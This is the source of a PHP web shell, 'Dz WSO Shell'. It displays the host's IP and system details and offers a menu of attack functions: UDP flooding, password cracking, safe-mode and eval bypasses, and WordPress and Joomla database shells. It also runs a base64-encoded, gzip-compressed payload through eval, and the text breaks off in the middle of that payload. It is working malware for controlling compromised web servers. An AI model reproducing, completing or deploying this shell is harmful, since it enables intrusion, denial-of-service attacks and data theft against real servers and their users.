<BODY OnKeyPress="GetKeyCode();" text=#ffffff bottomMargin=0 bgColor=#000000 leftMargin=0 topMargin=0 rightMargin=0 marginheight=0 marginwidth=0><center><TABLE style="BORDER-COLLAPSE: collapse" height=0 cellSpacing=0 borderColorDark=#666666 cellPadding=2 width="100%" bgcolor=#000000 borderColorLight=#c0c0c0 border=1 bordercolor="#C0C0C0"><tr><th width="101%" height="2" nowrap bordercolor="#FFFFFF" valign="top" colspan="2"><center><font color="#d27700">
    
	   <pre># -=|<blink> Dz WSO Shell </blink>|=- #</pre>
       <p align="left"><font color="#4d8510">
  <a> IP : </a><?php echo $_SERVER ['SERVER_ADDR']; ?></font></p>
  <p align="left"><b>uname -a:&nbsp;<?php echo wordwrap(php_uname(),90,"<br>",1); ?></b>&nbsp;</p>
       <p></font></a><font size="2.5"> <font size="2" face="Geneva, Arial, Helvetica, sans-serif"><a href="?Dz=PHP_1"><font color="#FFFFFF" face="Arial, Helvetica, sans-serif">[</font><font color="0ba821" face="Arial, Helvetica, sans-serif">WSO Shell</font></a><font face="Arial, Helvetica, sans-serif">]&nbsp;&nbsp;[<a href="?Dz=PHP_2"><font color="0ba821">Dz Domains</font></a>]&nbsp; [<a href="?Dz=PHP_3"><font color="0ba821">MySql Interface</font></a>]&nbsp;&nbsp;[<a href="?Dz=PHP_4"><font color="0ba821">UDP Flood<font color="#FFFFFF">]</font></font></a>&nbsp;&nbsp;[<a href="?Dz=PHP_18"><font color="0ba821">WHMc</font></a>] [<a href="?Dz=PHP_19"><font color="0ba821">SsiBypass<font color="#FFFFFF">]</font></font></a>&nbsp;&nbsp;&nbsp;[<a href="?Dz=PHP_22"><font color="0ba821">Wordpress Mysql  Shell<font color="#FFFFFF">]</font></font></a>&nbsp;&nbsp;<a href="?Dz=PHP_23"><font color="#FFFFFF">[</font><font color="0ba821">Joomla Mysql Shell<font color="#FFFFFF">]</font></font></a>&nbsp;&nbsp;</font></font></font></p>
       <p><font size="2"><font face="Geneva, Arial, Helvetica, sans-serif"><font face="Arial, Helvetica, sans-serif"><a href="?Dz=PHP_24"><font color="#FFFFFF">      [</font><font color="0ba821">Php Eval Bypass</font></a>]&nbsp;&nbsp;&nbsp;<a href="?Dz=PHP_10"><font color="#FFFFFF">[</font><font color="0ba821">Cracker<font color="#FFFFFF">]</font></font></a>&nbsp;&nbsp;<a href="?Dz=PHP_27"><font color="#FFFFFF">[</font><font color="0ba821">Safe Mode<font color="#FFFFFF">]</font></font></a></font></font></font><font size="2.5"><font size="1" face="Geneva, Arial, Helvetica, sans-serif"><font face="Verdana, Arial, Helvetica, sans-serif">&nbsp;</font></font><font face="Geneva, Arial, Helvetica, sans-serif">&nbsp;</font></font>              </p>
</center></th></tr><tr><td> 























<?PHP
function printit ($string) {
   if (!$daemon) {
      print "$string\n";
   }
}
$bc = $_GET["Dz"];
switch($bc){

case "PHP_18":
eval(gzinflate(base64_decode('FZfHDoRIEkTv8yM7Iw54pzUjPI337rLCe28a+PrtPSMVlVmRGS/+/s+//l6a5Y8/yisd/qzfdqqG9Cj/zNK9JLD/FmU+F+Wf/+CTEuV3T2J8hwTjetgl1tylhzWL7528sZRTRBIBwMaFxD3K6IsvIAheqBXpNAiKUu5W9ER7SYe4BUmFZZoxIQu61LW3/QVeT0QoeWvRo3OqxszR8BzLLJsAshKXOH+U2BZU20l37e45FsYnzMB9sIZroCv9LE8fexT3SZfzW4YV4ww9hzUpkQ2HhnaFRlyd2poziqAKOJY+PcL9ZVI62spNJOzUWNn5UjlZWn75jFAIQcPMekNjP9JjD1xKAs4IfQDuzE40EmzciyvZVM/Ep9IdJG186nPXZSAaqC7aEipWeUGqz8IkOGo3AoTxum+nRSpuV0NBNlw9I8QpjzHkX0eJvQ02XNu+K7gt0aqm75Aeopt5xXY6PFRDAmmq3Ff1/MX99aEY3RfXm4y225vvLklgI9lJFDAQpp2OrywUB8UlLu/jTclsZuNI3MrcDtUG7ktUQgoikoPfJnJKtWruXyuvcctmD0fJBvgX2gRcngonn7z9C8MjttrT+8iznTgsBGiLkX26QHkW6/ddyrl03smvdTm5iJKPvw/UnlCAWm/nKrnOSX8soBzZ42GgZrReXcMOYhlyFVM+FwIGCZdAJwmoOgpr14yIftWlsikdSuI6QJQZyQ0LYvywZc+yJLHwj3vokWMYo7uVybJChH+KYBymWvvVxG/Tf7rCrT5uz/kBlVXeuE8OS/IkSg0Qk0S2gj+43Pf10Uzx4DXS57ual4htfsmcDquLSq4Gip1HJ0KlGu6YjkrnYF/c4Hoj+nqPXxLTNbyqk4kBizKOm6tsyMMy0ScUIUB5Uoc+82x65q+2fY1r1u+c0Nz01ZSvvNxbhcAMs+qes96iaE7AANkxRMfK2Jr9wSo+Kk21tMNbEY3CMQwpZ2K+rfJRH6zCZ1CKBtUlXn22l9lM6860tWU3lyhoo3MLqulvfYHLgwRK8xmwAuB7WYet7Cl9dS1AGVLJvBA1ZJIF0ZN6tSotiCKXuvW1N7AaiIULVwVZn9cUlWkS86x5a2/Gz0Nta6Qw52wKLPho61mL1UzUOwAq79cLERuYI3Jp+mCwdfqCvFXGCXby4UQ1AFmg5IXiltaAb0BIuOLwmnxsz4U48tQMx1/rOPUUgLY1o3X2sOYTKp2CeMTcfU/tEeTxsrYZfzuWDC8FjIg7TeB7q2nGnP2rfI+9I6bw+zHr4gCpqmJxfQXKQEkfwcwthWO1xgdI93hl9cxCs1aclyJF5qbkOP5wcj9sJ+uKE14FmunUtaGo9BHP6rbLC5xsaRoMWyRy/5fWR2kR4b0CZTo0Nzj